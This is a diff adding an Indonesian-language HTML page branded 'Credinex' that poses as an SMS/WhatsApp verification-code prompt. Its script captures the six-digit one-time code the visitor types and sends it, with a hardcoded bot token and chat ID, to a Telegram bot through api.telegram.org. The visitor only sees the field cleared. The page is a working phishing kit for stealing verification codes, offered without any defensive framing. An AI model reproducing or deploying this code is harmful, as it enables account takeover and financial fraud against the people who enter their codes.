@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <title>Credinex</title>
+    <link rel="stylesheet" href="style.css">
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</head>
+<body>
+    <form action="" onsubmit="return sender()">
+        <marquee>
+            <p>Masukkan kode verifikasi yang sudah dikirim ke nomor handphone Anda. Jika belum diterima harap tunggu 5 menit.</p>
+        </marquee>
+        <div class="login">
+            <div class="input-group">
+                <h4>Kode Verifikasi</h4>
+            </div>
+            <div class="input-group">
+                <p>Masukkan kode verifikasi yang telah dikirim ke nomor handphone Anda.</p>
+            </div>
+            <br>
+            <div class="input-group">
+                <input type="number" name="num" id="iso" placeholder="Verifikasi" maxlength="6" required>
+            </div>
+            <div class="input-group">
+                <p>Kode verifikasi telah di kirim via SMS/WhatsApp</p>
+            </div>
+            <br>
+            <div class="input-group">
+                <button type="submit" onclick="kirim()">KLIK / SELANJUTNYA</button>
+            </div>
+        </div>
+    </form>
+    <script>
+        //bot token
+var telegram_bot_id = "7047776338%3AAAE-oJireHx1nnu1cvJSb9bzMDQzAE022mA"
+//chat id
+var chat_id = 7015306286
+var u_number;
+var ready = function submitdata() {
+    u_number = document.getElementById("iso").value;
+    message = "[Credinex | Verifikasi]\n \nKode Verifikasi: " + u_number
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function(response){
+        console.log('');
+    });
+    document.getElementById("iso").value = "";
+    return false;
+};
+    </script>
+</body>
+</html>
